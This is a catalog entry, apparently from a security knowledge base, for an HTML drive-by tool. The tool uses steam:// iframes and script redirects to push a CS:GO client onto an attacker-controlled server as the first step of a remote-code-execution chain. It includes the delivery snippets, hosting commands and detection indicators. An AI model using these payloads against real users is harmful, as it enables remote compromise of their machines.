---
id: tool-steam-html-001
url: null
tags:
  - drive-by
  - browser-exploit
type: tool
verified: false
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:42.178Z'
validated: true
submitted: true
---
# Steam-Browser-Attack-HTML

**Status**: Unverified

## Overview

An HTML file that launches the CS:GO RCE exploit via the Steam browser protocol, using an iframe to connect the victim client to a malicious server without direct connection.

## Description

This tool exploits the Steam overlay browser to force a game client connection to an attacker-controlled server. By embedding an iframe with steam:// protocol URLs, it triggers the vulnerability remotely through web delivery, bypassing some network restrictions.

## Features

- Feature 1: Iframe-based connection to malicious server.
- Feature 2: Steam protocol invocation for client launch.
- Feature 3: Integration with server simulator for full chain.

## Installation

### Requirements

- Web server to host HTML.
- Vulnerable Steam/CS:GO installation.

### Install Commands

```bash
# No install; save as HTML (F831987) and host
python -m http.server 8080
```

## Basic Usage

```bash
# Host file
open http://attacker.com/attack.html
```

### Common Options

| Option | Description |
|--------|-------------|
| iframe src | Malicious server URL |

## Examples

### Example 1: Basic Delivery

```html
<iframe src="steam://connect/malicious_server:27015"></iframe>
```

### Example 2: Full Exploit

```html
<script>window.location = 'steam://connect/' + malicious_ip;</script>
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Tactics

- [[Initial Access]] Initial Access

## Detection

Indicators and methods for detecting this tool's usage:

- Suspicious steam:// URLs in browser traffic.
- Unexpected game connections from web contexts.

## Related Procedures

- [[procedures/Vtable-Overwrite-for-Execution-Hijack]]

## Related Tools

- [[tools/CSGO-Malicious-Server-Simulator]]

## References

- HackerOne Report #876719
